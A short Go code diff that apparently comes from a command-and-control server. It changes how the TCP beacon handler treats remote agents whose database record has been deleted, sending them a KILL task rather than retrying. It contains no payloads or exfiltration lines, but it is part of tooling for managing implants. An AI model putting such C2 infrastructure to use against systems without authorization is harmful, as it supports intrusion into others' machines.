@@ -3,6 +3,7 @@ package server
 import (
 	"context"
 	"crypto/rand"
+	"database/sql"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/json"
@@ -270,9 +271,13 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 		case "beacon":
 			ag, dbErr := s.db.GetAgent(agentID)
 			if dbErr != nil {
-				// A transient SQLite/WAL error must not be interpreted as an
-				// operator kill. Return an empty response and let the next
-				// beacon retry the database operation.
+				if dbErr == sql.ErrNoRows {
+					// Agent record was deleted while session was alive — kill it.
+					killWires := []taskWire{{ID: 0, Type: "KILL", Args: ""}}
+					_ = tcpWriteTasks(conn, key, beaconResponse{Tasks: killWires})
+					return
+				}
+				// Transient SQLite/WAL error — return empty response and retry.
 				s.printf("[!] TCP agent %s: get agent state failed: %v\n", agentID[:8], dbErr)
 				if writeErr := tcpWriteTasks(conn, key, beaconResponse{Tasks: []taskWire{}}); writeErr != nil {
 					disconnectReason = fmt.Sprintf("write db-retry response: %v", writeErr)
@@ -281,7 +286,7 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 				continue
 			}
 			if !ag.Active {
-				// Agent was deleted or killed — send KILL using the session key
+				// Agent was killed — send KILL using the session key
 				// (identical to the AES key stored in DB / ghost map) and close.
 				killWires := []taskWire{{ID: 0, Type: "KILL", Args: ""}}
 				_ = tcpWriteTasks(conn, key, beaconResponse{Tasks: killWires})
